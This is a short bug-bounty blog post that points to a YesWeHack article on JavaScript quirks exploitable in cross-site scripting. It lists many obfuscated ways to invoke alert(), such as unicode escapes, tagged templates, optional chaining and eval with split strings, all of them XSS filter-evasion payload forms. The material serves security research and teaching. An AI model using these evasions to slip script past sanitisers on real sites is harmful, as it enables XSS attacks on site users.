---
layout: post
title:  "Exploring JavaScript's Exploits: A Deep Dive Into XSS Vulnerabilities"
tags: [javascript, web, hacking, yeswehack]
categories: [bugbounty]
---

JavaScript, a programming language widely used on the Internet, can be utilized on both the client and server side for development. It's implemented on almost all web pages. This article will delve into JavaScript's unique and intriguing behaviours, including how they can be exploited in an XSS attack or a cross site scripting attack. We'll explore how these behaviours can be used in security research, and why they're relevant to web security, particularly in the context of the OWASP top ten.

```javascript
window.alert()
window['alert']()
alert()
alert``
onload=alert
\u0061lert()
globalThis.alert()
window?.alert()
eval?.('ale'+'rt('+')')
[1].find(alert)

好=alert,好()
var x=x||alert;x()
alert(1),ErrExit
[][0]??alert()
null??alert()
undefined??alert()
x??alert();var x;
```

> You can find the full article on [YesWeHack's blog page](https://www.yeswehack.com/learn-bug-bounty/javascript-language-made-for-bugs){:target="_blank"}
{: .prompt-info }